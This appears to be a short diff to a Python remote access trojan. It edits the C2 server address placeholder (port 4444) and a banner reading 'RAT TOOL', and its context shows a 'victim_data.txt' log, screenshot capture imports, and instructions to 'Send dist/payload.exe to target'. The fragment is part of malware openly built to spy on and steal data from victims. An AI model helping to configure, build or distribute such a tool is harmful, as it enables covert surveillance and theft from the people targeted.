@@ -42,7 +42,7 @@ import GPUtil
 import pyscreenshot
 import zipfile
 
-YOUR_IP = "192.168.1.3"  # Default to localhost for testing; update to your C2 server IP
+YOUR_IP = "YOUR_IP_HERE"
 PORT = 4444
 LOG_FILE = "victim_data.txt"
 
@@ -976,7 +976,7 @@ if __name__ == "__main__":
         sys.exit(1)
     
     print(f'''
-[✅] ADVANCED RAT TOOL - READY TO USE
+[✅] RAT TOOL - GitHub Threadlinee
 
 [📌] INSTRUCTIONS:
 1. Send dist/payload.exe to target
